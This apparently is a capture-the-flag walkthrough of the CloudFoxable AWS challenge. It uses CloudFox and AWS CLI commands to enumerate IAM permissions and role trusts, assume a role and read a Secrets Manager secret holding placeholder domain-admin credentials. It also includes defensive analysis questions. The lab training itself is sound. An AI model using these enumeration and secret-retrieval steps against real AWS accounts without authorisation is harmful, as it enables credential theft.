
# 🔐 CloudFoxable Challenge: Retrieving AWS Secrets Manager Flag

## 🧾 Overview

In this CloudFoxable challenge, the task was to identify and assume an AWS IAM role capable of retrieving a specific secret from AWS Secrets Manager named `DomainAdministrator-Credentials`. The challenge simulated a real-world cloud penetration test scenario, focusing on enumerating permissions, analyzing IAM role trust relationships, and leveraging AWS CLI tools to escalate privileges and retrieve sensitive information (flag).

---

## 🎯 Objectives

- Discover IAM roles with access to the targeted Secrets Manager secret.
- Analyze IAM trust relationships to identify role assumption opportunities.
- Inspect IAM policies to confirm permissions explicitly granted.
- Assume an IAM role based on trust policy analysis.
- Retrieve the secret's value (flag) using AWS CLI.

---

## 🚩 Solution Steps

The following commands and methodology were used step-by-step to successfully retrieve the flag:

### ✅ Step 1: Enumerate Permissions (CloudFox)

```bash
cloudfox aws -p cloudfoxable permissions -v2 | grep -i secret
```

**Expected Output:**

```
Role │ Alexander-Arnold │ Allow │ secretsmanager:GetSecretValue │ arn:aws:secretsmanager:us-west-2:495804826271:secret:DomainAdministrator-Credentials-qc9Cvn
```

---

### ✅ Step 2: Analyze IAM Trust Relationships (CloudFox)

```bash
cloudfox aws -p ashish_security role-trusts -v2
```

**Expected Output:**

```
Role: Alexander-Arnold
Trusts: arn:aws:iam::495804826271:user/ctf-starting-user
```

---

### ✅ Step 3: List Attached IAM Policies (AWS CLI)

```bash
aws --profile cloudfoxable iam list-attached-role-policies --role-name Alexander-Arnold
```

**Expected Output:**

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "corporate-domain-admin-password-policy",
      "PolicyArn": "arn:aws:iam::495804826271:policy/corporate-domain-admin-password-policy"
    }
  ]
}
```

---

### ✅ Step 4: Retrieve IAM Policy Metadata (AWS CLI)

```bash
aws --profile cloudfoxable iam get-policy --policy-arn arn:aws:iam::495804826271:policy/corporate-domain-admin-password-policy
```

**Expected Output:**

```json
{
  "Policy": {
    "PolicyName": "corporate-domain-admin-password-policy",
    "Arn": "arn:aws:iam::495804826271:policy/corporate-domain-admin-password-policy",
    "DefaultVersionId": "v1",
    "AttachmentCount": 1,
    "IsAttachable": true,
    "CreateDate": "2025-03-05T22:48:54+00:00",
    "UpdateDate": "2025-03-05T22:48:54+00:00"
  }
}
```

---

### ✅ Step 5: Confirm IAM Policy Permissions (AWS CLI)

```bash
aws --profile cloudfoxable iam get-policy-version \
  --policy-arn arn:aws:iam::495804826271:policy/corporate-domain-admin-password-policy \
  --version-id v1
```

**Expected Output:**

```json
{
  "PolicyVersion": {
    "Document": {
      "Statement": [
        {
          "Action": ["secretsmanager:GetSecretValue"],
          "Effect": "Allow",
          "Resource": [
            "arn:aws:secretsmanager:us-west-2:495804826271:secret:DomainAdministrator-Credentials-qc9Cvn"
          ]
        }
      ],
      "Version": "2012-10-17"
    },
    "VersionId": "v1",
    "IsDefaultVersion": true,
    "CreateDate": "2025-03-05T22:48:54+00:00"
  }
}
```

---

### ✅ Step 6: Assume IAM Role & Retrieve the Secret (Flag)

```bash
aws --profile Alexander-Arnold secretsmanager get-secret-value \
  --secret-id arn:aws:secretsmanager:us-west-2:495804826271:secret:DomainAdministrator-Credentials-qc9Cvn \
  --region us-west-2
```

✅ **Expected Output:**

```json
{
  "Name": "DomainAdministrator-Credentials-qc9Cvn",
  "SecretString": "{\"username\":\"admin\",\"password\":\"flag{your-flag-here}\"}"
}
```

---

## ❓ Analysis Questions

1. **Why did we need to inspect both permissions and role trust policies?**  
   To ensure we could not only identify which role had access to the secret but also verify that our user could assume the role.

2. **What happens if a role's trust policy is overly permissive?**  
   It can lead to privilege escalation risks by allowing unintended principals to assume sensitive roles.

3. **Why is explicitly specifying resources in IAM policies important?**  
   It prevents unintended access to unrelated or sensitive resources, minimizing security risks.

4. **Can a user assume an IAM role without explicit `sts:AssumeRole` permission in their policy?**  
   Yes, if the role's trust policy explicitly names the user or their ARN as a trusted principal.

5. **How does using tools like CloudFox help improve cloud security posture?**  
   CloudFox helps quickly identify permissions and trust policy misconfigurations, enabling proactive security hardening and effective penetration testing.

---

## ✅ Conclusion

Through careful enumeration, policy analysis, and leveraging AWS CLI and CloudFox tools, we successfully demonstrated a realistic AWS IAM security scenario: identifying a secret, mapping out access permissions, validating role assumption possibilities, and retrieving the sensitive data (flag).

The exercise highlights crucial AWS security principles, including the separation of permissions and trust policies, the principle of least privilege, and the importance of comprehensive cloud security testing.

---

### 📚 References & Tools

- **CloudFox:** [https://github.com/BishopFox/cloudfox](https://github.com/BishopFox/cloudfox)
- **AWS CLI IAM Documentation:** [AWS IAM CLI](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html)
- **AWS Secrets Manager CLI:** [AWS Secrets Manager CLI](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/secretsmanager/index.html)

---

*Prepared by: Ashish Gurau*  
*Cloud Security & IAM Enumeration Walkthrough*
